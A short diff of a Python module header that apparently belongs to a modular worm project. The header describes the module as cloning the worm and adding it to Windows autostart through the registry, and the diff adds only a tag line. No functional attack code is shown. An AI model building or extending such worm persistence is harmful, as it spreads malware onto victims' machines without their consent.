@@ -3,6 +3,7 @@
 #!reqSMod##MrReg
 #!info##Clones the worm and adds it to the autostart. Uses the windows registry.
 #!system_FLAG##[W]
+#!TAGS##[PyS]
 
 import os
 import shutil
